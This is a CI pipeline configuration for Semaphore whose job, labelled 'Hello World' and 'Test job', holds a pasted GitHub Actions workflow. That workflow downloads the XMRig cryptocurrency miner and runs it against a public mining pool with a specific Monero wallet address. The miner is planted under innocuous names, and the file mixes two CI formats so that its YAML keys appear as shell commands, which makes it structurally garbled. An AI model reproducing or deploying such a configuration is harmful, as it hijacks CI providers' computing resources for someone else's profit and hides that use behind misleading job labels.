version: v1.0
name: Run in Docker
agent:
  machine:
    type: f1-standard-2
    os_image: ubuntu2404
  containers:
    - name: main
      image: 'registry.semaphoreci.com/node:10'
    - name: database
      image: 'registry.semaphoreci.com/postgres:11'
blocks:
  - name: Hello World
    task:
      jobs:
        - name: Test job
          commands:
            - 'name: XMRig Mining'
            - 'on:'
            - '  workflow_dispatch:   # Manual trigger'
            - '  push:                # Optional: run on code push'
            - '    branches:'
            - '      - main'
            - 'jobs:'
            - '  cpu_mining:'
            - '    runs-on: ubuntu-latest'
            - '    steps:'
            - '      - name: Checkout repository'
            - '        uses: actions/checkout@v3'
            - '      - name: Install dependencies'
            - '        run: |'
            - '          sudo apt-get update'
            - '          sudo apt-get install -y wget tar'
            - '      - name: Download xmrig'
            - '        run: |'
            - '          wget https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.25.0-linux-static-x64.tar.gz'
            - '          tar -xf xmrig-6.25.0-linux-static-x64.tar.gz'
            - '          cd xmrig-6.25.0'
            - '      - name: Run xmrig miner'
            - '        run: |'
            - '          cd xmrig-6.25.0'
            - '          ./xmrig -a rx \'
            - '            -o stratum+ssl://rx-eu.unmineable.com:443 \'
            - '            -u XMR:49hnWUygafF8tTZ48PmT9WJvRTkRLMWskNmtFddkVHRi1XAvBeHdiTb29edTDZ8QywLGZzMvV4PBGMfrTBJgZ1dJM7PrubE.unmineable_worker_cc21 \'
            - '            -p x'
